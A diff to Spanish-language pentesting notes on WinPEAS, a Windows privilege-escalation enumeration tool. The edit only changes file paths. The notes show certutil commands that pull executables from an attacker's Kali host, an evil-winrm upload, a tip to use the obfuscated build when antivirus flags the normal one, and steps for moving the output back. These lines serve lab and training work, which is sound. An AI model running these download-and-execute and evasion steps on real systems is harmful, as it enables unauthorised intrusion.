@@ -26,11 +26,11 @@ Tags: #WinPEAS #Windows #PrivEsc #Enumeracion #PostExplotacion #Automatizacion
 ```powershell
 # Transferir desde Kali
 # En Kali → python3 -m http.server 80
-❯ certutil -urlcache -f http://<IP_KALI>/winPEASany.exe C:\tmp\winPEAS.exe
-❯ certutil -urlcache -f http://<IP_KALI>/winPEASany_ofs.exe C:\tmp\winPEAS_ofs.exe
+❯ certutil -urlcache -f http://<IP_KALI>/winPEASany.exe C:\Temp\winPEAS.exe
+❯ certutil -urlcache -f http://<IP_KALI>/winPEASany_ofs.exe C:\Temp\winPEAS_ofs.exe
 
 # Desde evil-winrm
-❯ upload /ruta/kali/winPEASany.exe
+❯ upload /home/kali/winPEASany.exe
 
 # Ejecutar desde C:\tmp o C:\Windows\Temp
 ❯ .\winPEASany.exe
@@ -40,8 +40,8 @@ Tags: #WinPEAS #Windows #PrivEsc #Enumeracion #PostExplotacion #Automatizacion
 # Versión ofuscada → cuando AV detecta la normal
 
 # Guardar output a archivo → SIEMPRE hacerlo
-❯ .\winPEASany.exe > C:\tmp\winpeas_output.txt
-❯ .\winPEASany.exe | Out-File -Encoding ASCII C:\tmp\winpeas_output.txt
+❯ .\winPEASany.exe > C:\Temp\winpeas_output.txt
+❯ .\winPEASany.exe | Out-File -Encoding ASCII C:\Temp\winpeas_output.txt
 
 # Transferir el output a Kali para revisarlo cómodamente
 ❯ download C:\tmp\winpeas_output.txt    # Desde evil-winrm
